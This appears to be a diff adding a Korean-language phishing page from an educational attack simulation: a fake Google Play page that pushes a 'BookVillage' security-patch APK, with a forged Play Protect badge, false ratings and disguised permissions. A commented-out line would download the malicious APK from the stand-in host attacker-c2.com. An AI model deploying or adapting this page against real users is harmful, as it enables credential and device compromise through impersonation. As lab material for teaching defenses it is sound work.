@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<!--
+    ══════════════════════════════════════════════════════════════════════
+     [Phase 3] 가짜 구글 플레이 스토어 피싱 페이지
+     공격자 서버(attacker-c2.com)에서 호스팅
+     교육용 시뮬레이션 - 실제 사용 불가
+
+     공격 흐름:
+       1. 사용자가 북촌 공식 공지사항의 링크 클릭
+       2. WebView가 이 페이지 로드 (HTTP → usesCleartextTraffic=true 허용)
+       3. 사용자는 '구글 플레이' 디자인을 신뢰
+       4. '업데이트' 버튼 클릭 → BookVillage_Security_Patch.apk 다운로드
+       5. '출처를 알 수 없는 앱' 경고를 공식 공지사항을 믿고 무시 → 설치
+    ══════════════════════════════════════════════════════════════════════
+-->
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>BookVillage - Google Play</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #f8f9fa;
+            color: #202124;
+        }
+
+        /* 구글 플레이 스토어 헤더 */
+        .header {
+            background: #fff;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .play-icon {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, #01875f, #34a853);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+        }
+        .header-title {
+            font-size: 18px;
+            font-weight: 400;
+            color: #5f6368;
+        }
+
+        /* 앱 정보 섹션 */
+        .app-header {
+            background: #fff;
+            padding: 24px 16px 16px;
+            display: flex;
+            gap: 16px;
+            align-items: flex-start;
+            margin-top: 8px;
+        }
+        .app-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #1a73e8, #0d47a1);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            flex-shrink: 0;
+        }
+        .app-info { flex: 1; }
+        .app-name {
+            font-size: 22px;
+            font-weight: 500;
+            color: #202124;
+            line-height: 1.3;
+        }
+        .app-developer {
+            font-size: 14px;
+            color: #1a73e8;
+            margin-top: 4px;
+        }
+        .app-meta {
+            display: flex;
+            gap: 16px;
+            margin-top: 8px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .rating { display: flex; align-items: center; gap: 4px; }
+        .stars { color: #f4b400; }
+
+        /* 설치 버튼 */
+        .install-section {
+            background: #fff;
+            padding: 16px;
+            margin-top: 1px;
+        }
+        .btn-install {
+            width: 100%;
+            padding: 14px;
+            background: #01875f;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            letter-spacing: 0.25px;
+        }
+        .btn-install:active { background: #016a4c; }
+        .install-note {
+            text-align: center;
+            font-size: 11px;
+            color: #5f6368;
+            margin-top: 8px;
+        }
+
+        /* 보안 배지 (신뢰도 향상 위장) */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #e8f5e9;
+            border-radius: 8px;
+            padding: 10px 12px;
+            margin-top: 12px;
+        }
+        .badge-icon { color: #1e8e3e; font-size: 20px; }
+        .badge-text { font-size: 12px; color: #1e8e3e; }
+
+        /* 긴급 업데이트 배너 */
+        .urgent-banner {
+            background: #fce8e6;
+            border-left: 4px solid #d93025;
+            padding: 12px 16px;
+            margin: 8px 0;
+            font-size: 13px;
+            color: #d93025;
+        }
+
+        /* 앱 설명 */
+        .section {
+            background: #fff;
+            padding: 16px;
+            margin-top: 8px;
+        }
+        .section-title {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 12px;
+        }
+        .description {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #3c4043;
+        }
+
+        /* 권한 목록 */
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 0;
+            border-bottom: 1px solid #f1f3f4;
+            font-size: 13px;
+        }
+        .permission-icon { color: #5f6368; font-size: 20px; }
+
+        /* 다운로드 진행바 (버튼 클릭 시) */
+        .progress-container { display: none; margin-top: 12px; }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: #01875f;
+            width: 0%;
+            transition: width 0.1s linear;
+        }
+        .progress-text {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 4px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<!-- 구글 플레이 헤더 위장 -->
+<div class="header">
+    <div class="header-logo">
+        <div class="play-icon">▶</div>
+        <span class="header-title">Google Play</span>
+    </div>
+</div>
+
+<!-- 긴급 업데이트 배너 -->
+<div class="urgent-banner">
+    ⚠️ 긴급 보안 취약점이 발견되었습니다. 즉시 업데이트하세요.
+</div>
+
+<!-- 앱 정보 -->
+<div class="app-header">
+    <div class="app-icon">📚</div>
+    <div class="app-info">
+        <div class="app-name">BookVillage<br>보안 패치</div>
+        <div class="app-developer">BookVillage Corp.</div>
+        <div class="app-meta">
+            <div class="rating">
+                <span class="stars">★★★★★</span>
+                <span>4.8</span>
+            </div>
+            <span>리뷰 12,847개</span>
+            <span>5M+ 다운로드</span>
+        </div>
+    </div>
+</div>
+
+<!-- 설치 버튼 -->
+<div class="install-section">
+    <button class="btn-install" onclick="startDownload()">
+        업데이트 (긴급)
+    </button>
+    <div class="install-note">BookVillage_Security_Patch.apk • 8.4MB</div>
+
+    <!-- 보안 배지 (신뢰도 위장) -->
+    <div class="security-badge">
+        <span class="badge-icon">🛡️</span>
+        <span class="badge-text">Play Protect에서 이 앱을 검사했습니다. 위협이 발견되지 않았습니다.</span>
+    </div>
+
+    <!-- 다운로드 진행바 -->
+    <div class="progress-container" id="progressContainer">
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="progress-text" id="progressText">다운로드 중... 0%</div>
+    </div>
+</div>
+
+<!-- 앱 설명 -->
+<div class="section">
+    <div class="section-title">앱 정보</div>
+    <div class="description">
+        BookVillage 보안 패치는 최근 발견된 심각한 보안 취약점을 수정합니다.<br><br>
+        <strong>주요 수정 사항:</strong><br>
+        • CVE-2024-XXXX 원격 코드 실행 취약점 패치<br>
+        • 개인정보 보호 강화<br>
+        • 결제 정보 암호화 개선<br>
+        • SSL 인증서 검증 강화<br><br>
+        <em>본 업데이트는 북촌 도서 서비스 공식 공지에 따른 필수 보안 업데이트입니다.</em>
+    </div>
+</div>
+
+<!-- 요청 권한 (정상처럼 위장) -->
+<div class="section">
+    <div class="section-title">앱 권한</div>
+    <div class="permission-item">
+        <span class="permission-icon">🌐</span>
+        <span>인터넷 액세스 - 보안 업데이트 서버 연결</span>
+    </div>
+    <div class="permission-item">
+        <span class="permission-icon">🔔</span>
+        <span>알림 전송 - 보안 상태 알림</span>
+    </div>
+    <div class="permission-item">
+        <span class="permission-icon">⚡</span>
+        <span>기기 시작 시 실행 - 실시간 보안 모니터링</span>
+    </div>
+    <div class="permission-item">
+        <span class="permission-icon">🔋</span>
+        <span>배터리 최적화 무시 - 지속적 보안 감시</span>
+    </div>
+</div>
+
+<script>
+    /**
+     * [Phase 3] 악성 APK 다운로드 트리거
+     *
+     * 실제 공격 흐름:
+     *   1. 사용자가 '업데이트' 버튼 클릭
+     *   2. 공격자 서버에서 BookVillage_Security_Patch.apk 다운로드 유도
+     *   3. Android WebView 또는 기본 브라우저가 다운로드 시작
+     *   4. 사용자가 '출처를 알 수 없는 앱 설치' 경고를 무시하고 설치
+     *      → '공식 공지사항'을 통해 유입됐으므로 신뢰도 높음
+     *
+     * 방어 방법:
+     *   - '출처를 알 수 없는 앱 설치' 항상 비활성화
+     *   - Google Play 이외 경로의 APK 설치 금지
+     *   - URL 바 확인: 공식 play.google.com 도메인인지 확인
+     */
+    function startDownload() {
+        // 다운로드 진행 UI 표시 (신뢰감 제공)
+        const container = document.getElementById('progressContainer');
+        const fill      = document.getElementById('progressFill');
+        const text      = document.getElementById('progressText');
+        container.style.display = 'block';
+
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.random() * 8 + 2;
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(interval);
+                text.textContent = '다운로드 완료 - 설치를 진행하세요';
+
+                // 실제 공격: 공격자 서버에서 악성 APK 다운로드
+                // window.location.href = 'http://attacker-c2.com/BookVillage_Security_Patch.apk';
+
+                // 교육용: 실제 다운로드 없음 (주석 처리)
+                text.textContent = '[교육용] 실제 다운로드 없음 - 시뮬레이션 완료';
+            }
+            fill.style.width = progress + '%';
+            if (progress < 100) {
+                text.textContent = `다운로드 중... ${Math.floor(progress)}%`;
+            }
+        }, 150);
+    }
+</script>
+
+</body>
+</html>
